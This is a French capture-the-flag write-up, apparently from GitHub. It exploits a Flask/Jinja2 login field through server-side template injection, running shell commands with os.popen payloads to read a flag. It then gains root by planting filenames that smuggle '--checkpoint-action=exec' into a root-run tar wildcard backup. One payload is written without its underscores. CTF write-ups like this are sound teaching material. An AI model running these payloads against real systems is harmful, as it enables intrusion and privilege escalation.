On commence par un scan nmap de l'ip fournit dans l'énoncé pour identifier les techs utilisés, on obtient :

<img width="820" height="158" alt="image" src="https://github.com/user-attachments/assets/38186a6f-1790-47e4-a776-225a1bbf2b9e" />

`COOKIE{Flask:Werkzeug:3.1.3:3.13.5}`

Les techs utilisés + le nom du challenge nous montre le chemin, on test plusieurs champs différents, puis on découvre que le champ sur la fênetre d'identification est vulnérable, donc on essaye de ce login avec : 

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

La commande est bel et bien effectué, et on voit les dossiers "app" & "src" 

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls app/').read() }}
```
Nous montre le fichier "flag", donc il suffit de le lire : 

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/app/flag').read() }}
```

<img width="815" height="459" alt="image" src="https://github.com/user-attachments/assets/3402f041-974d-4295-b7fc-3ba8e28f66c3" />

Ensuite, dans l'énoncé on nous parle d'un certain script de backup. Le challenge ayant une 3ème parti qui est de la priv esc, on se doute que c'est surement le coup classique de la backup qui tourne en root. On vérifie donc 
```python
{{ self.init.globals.builtins.import('os').popen('find / -name "backup"')}} 
```

Et en effet, on trouve ce script : 

```bash
#!/bin/bash
# Backup files in /app/src ## Vars BACKUP_DIR='/backups' DIR_TO_BACKUP='/app/src'
## Create destination dir if it does not exist

if [[ ! -d "${BACKUP_DIR}" ]];
then mkdir -p "${BACKUP_DIR}"
fi
## Archive + compress
cd "${DIR_TO_BACKUP}" /usr/bin/tar cvzf "${BACKUP_DIR}/backup-$(date +%s)" *
## TODO : Someday export data to a storage server ## But not today :d !
```
On vérifie les permissions, et il tourne bien en root. L'autre vulnérabilité majeure est l'utilisation de `*` avec tar. Dans ce cas, tar va simplement lire le nom des fichiers comme si la commande était tar cvzf fichier1 fichier2, etc. Et donc il est possible de faire passer un fichier comme un argument de la commande. En effet, avec un fichier nommé --checkpoint on peut mettre en pause la commande actuelle pour, par example, éxécuté un script que nous avons écrit. 
---

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "cat /root/flag > /home/app/flag2" > src/evil.sh').read() }}
```
On créer le script evil.sh, on met une commande pour récupérer le flag dedans, sachant que cette commande sera éxécuté par le meme utilisateur qui run la backup, donc root. 

```python

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('touch src/--checkpoint=1').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('touch src/"--checkpoint-action=exec=sh evil.sh"').read() }}
```

Et puis on créer les fichiers qui seront interprétés comme des arguments par tar. 

Puis il suffit d'attendre que le fichier de backup s'éxécute, et voila : 

<img width="641" height="295" alt="image" src="https://github.com/user-attachments/assets/a5afe4c3-900d-42e8-a29a-e29b2720ce93" />
